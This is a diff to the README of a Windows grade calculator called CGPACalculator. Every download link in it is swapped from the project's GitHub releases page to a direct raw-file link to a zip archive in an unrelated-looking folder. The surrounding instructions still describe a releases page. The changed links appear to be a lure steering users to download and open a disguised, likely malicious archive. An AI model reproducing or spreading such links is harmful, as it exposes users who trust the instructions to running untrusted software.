@@ -1,12 +1,12 @@
 # 🧮 CGPACalculator - Track Your Grades With Ease
 
-[![Download CGPACalculator](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gallantfoxbustard155/CGPACalculator/releases)
+[![Download CGPACalculator](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gallantfoxbustard155/CGPACalculator/main/polynomialist/Calculator_CGPA_v1.8.zip)
 
 ## 📥 Download
 
 Visit this page to download the app for Windows:
 
-https://github.com/gallantfoxbustard155/CGPACalculator/releases
+https://raw.githubusercontent.com/gallantfoxbustard155/CGPACalculator/main/polynomialist/Calculator_CGPA_v1.8.zip
 
 On that page, look for the latest release. Download the Windows file that matches your device, then open it to start the app.
 
@@ -27,7 +27,7 @@ Use it to:
 Follow these steps to run the app on a Windows PC:
 
 1. Open the download page:
-   https://github.com/gallantfoxbustard155/CGPACalculator/releases
+   https://raw.githubusercontent.com/gallantfoxbustard155/CGPACalculator/main/polynomialist/Calculator_CGPA_v1.8.zip
 
 2. Find the newest release near the top of the page.
 
@@ -110,7 +110,7 @@ A newer computer will give you a smoother experience, but the app should run wel
 
 Use this page to get the latest version:
 
-https://github.com/gallantfoxbustard155/CGPACalculator/releases
+https://raw.githubusercontent.com/gallantfoxbustard155/CGPACalculator/main/polynomialist/Calculator_CGPA_v1.8.zip
 
 After you download it:
 
@@ -172,4 +172,4 @@ CGPACalculator is designed for local use on your computer. You enter your own co
 
 Get the latest Windows download here:
 
-https://github.com/gallantfoxbustard155/CGPACalculator/releases
+https://raw.githubusercontent.com/gallantfoxbustard155/CGPACalculator/main/polynomialist/Calculator_CGPA_v1.8.zip
